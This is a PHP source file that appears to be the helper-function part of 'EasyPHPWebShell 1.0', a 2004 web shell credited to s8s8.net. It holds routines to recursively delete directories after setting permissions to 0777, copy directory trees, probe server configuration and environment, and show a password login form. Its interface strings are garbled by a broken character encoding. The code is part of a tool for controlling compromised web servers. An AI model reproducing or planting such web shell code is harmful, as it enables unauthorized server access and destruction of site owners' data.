<?php

function array_stripslashes(&$array) {
    while(list($key,$var) = each($array)) {
        if ((strtoupper($key) != $key || ''.intval($key) == "$key") && $key != 'argc' && $key != 'argv') {
            if (is_string($var)) $array[$key] = stripslashes($var);
            if (is_array($var)) $array[$key] = array_stripslashes($var);  
        }
    }
    return $array;
}

function deltree($TagDir){ 
	$mydir=@opendir($TagDir); 
	while($file=@readdir($mydir)){ 
		if((is_dir("$TagDir/$file")) && ($file!=".") && ($file!="..")) { 
			if(!deltree("$TagDir/$file")) return false;
		}else if(!is_dir("$TagDir/$file")){
			@chmod("$TagDir/$file", 0777);
			if(!@unlink("$TagDir/$file")) return false;
		}
	} 
	@closedir($mydir); 
	@chmod("$TagDir", 0777);
	if(!@rmdir($TagDir)) return false;
	return true;
}

function copydir($dirf,$dirt){
    $mydir=@opendir($dirf);
    while($file=@readdir($mydir)){
        if((is_dir("$dirf/$file")) && ($file!=".") && ($file!="..")) {
            if(!file_exists("$dirt/$file")) if(!@mkdir("$dirt/$file")) return false;
            if(!copydir("$dirf/$file","$dirt/$file")) return false;
        }else if(!is_dir("$dirf/$file")) if(!@copy("$dirf/$file","$dirt/$file")) return false;
    }
    return true;
}

function truepath($path){
	if(file_exists($path)) return true;	
	else{
		if(truepath(@dirname($path))){
			if(@mkdir($path)) return true;
			else return false;
		}else return false;
	}
}

function getpageruntime(){
    global $pagestarttime;
    $pagestarttime = explode(' ', $pagestarttime);
    $pageendtime = explode(' ',@microtime());
    return ($pageendtime[0]-$pagestarttime[0]+$pageendtime[1]-$pagestarttime[1]);
}

function echoend(){
    echo "<br><center>ๆคค็ธใกักๆๅ ด:".getpageruntime()." ็ป<br>".
    "<span class = \"stylebtext2\">EasyPHPWebShell 1.0(S8S8ๅจด็็)</span><br>่ๆ๔ฑ <b>็ผ็ผๆๆ๔ซ๔ๅ(<a href=\"http://www.s8s8.net\">http://www.s8s8.net</a>) ZV(<a href=\"mailto:zvrop@163.com\">zvrop@163.com</a>)</b> ็ผๅ<br>".
    "Copyright (C) 2004 www.s8s8.net All Rights Reserved.</center>";
}

function gettruepath($path){
    return str_replace("\\","/",@realpath($path));
}

function my_func($getname,$tp){
	global $rny, $rnn;
	$out = ($tp==1)?@get_cfg_var($getname):(($tp==2)?@function_exists($getname):(($tp==3)?@get_magic_quotes_gpc($getname):(($tp==4)?@get_magic_quotes_runtime($getname):(($tp==5)?@Getenv($getname):"error!"))));
	return ($out == 1)?$rny:(($out == 0)?$rnn:$out);
}

function ch_color($c){
	return $c=="#CCCCCC"?"#EEEEEE":"#CCCCCC";
}

function getloginpass(){
	?>
	<br><br><br><br><br><br><br>
	<table align="center" width="300" border="0" cellpadding="0" cellspacing="0">
    <tr>
        <td align="center" bgcolor="#000000" class="stylebtext3">
            ๅจใฃฟๆตฃ่ทจจ,็็ฏพๅใฅฏ็ 
        </td>
    </tr>
	<tr>
		<form method="post" action="?action=login" enctype="multipart/form-data">
        <td align="center" class="style1"><br>็ต็ 
        <input name="pmy_password" type="password" size="30" class="style1"><p>
		<input name="pmy_passwordb" type="submit" value="  ็ๅฉ  " class="style1"><p>
        </td>
    </tr>
	</table>
	<?php
	exit;
}
?>
